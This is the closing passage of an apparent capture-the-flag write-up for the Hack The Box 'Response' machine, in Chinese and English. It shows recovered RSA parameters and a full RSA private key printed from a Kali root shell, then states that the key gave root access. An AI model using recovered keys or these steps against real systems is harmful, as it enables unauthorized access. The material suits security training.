8483bc88a19a0a9443ae2ef19c270d720f001d2d918a454ae15c84134845477ced87f7f62d0d70dc
923b1628f62237bb79c4c226122c2fed5aff7c3776a1a55379dd60ba60ba9b302a46d8810bcaec3b
225e4a937b7dd3818612691f35784cdbb6f4076a5fc8c381

p =
cb81180ac010abef4eb1a6fb04098da2e6d79c6cda7c0fbd1bbd5e3affeeca4385684bebd02e293e
91ad59faf3312bb243fc75b21ec1eb6462851293fb4861adef8acfbc81609c43de2facc2adbaa3df
6d85583633977c94c27f3777024029dd906cce1b7b9f6210676ff1a7a020a5de6b7d2d9066336ffd
82f2f26c951b3b271ba6ec3955b4790b5f7927fbbacd3ddf15beb819589bb45fd11a582e48c9646f
5ee71200a7cf301d99ed11ddca9d636991bc29dbcbd581ab143aadc24016c339

q =
c70b1a197099c0c6ff247f3c5ef1a1bb5068db3a2622169532b6cde71e2addced9d2ef609a45cef8
d58ca57ed3db497438110886b5ba0d03acc62b3f0ab4b9bbaf45ead5198e551d344d73204ec816fd
90bab33034bf3dfd29e541b7b6e316fe22369f29468e3ec35ca456a43f8bf19ca2febb0eaa168a91
7526729dd800ad92832b6e99ed9cdd576967da4ca22dfa2437c59b6311de43feff8d50577fbd4153
5f9783c5f8e278d5a775dff603ba71855aa9bd7106c67b6c6f166ab932723ed9

Saving PEM as private.pem
                                                                                                                                                    
┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]
└─# cat private.pem                                             
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

同样成功解密，使用恢复的私钥成功获得root权限

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response10.png)

#### Reference Sources

 - [0xdf's blog meterpreter-traffic-decryption](https://0xdf.gitlab.io/2023/02/04/htb-response.html#meterpreter-traffic-decryption)
 - [44maker's blog HTB Response](https://44maker.info/p/response/)
 - [HTB official response writeup](https://www.hackthebox.com/home/machines/writeup/468)


<!-- kb:end msf-meterpreter-traffic-decrypt -->

</details>

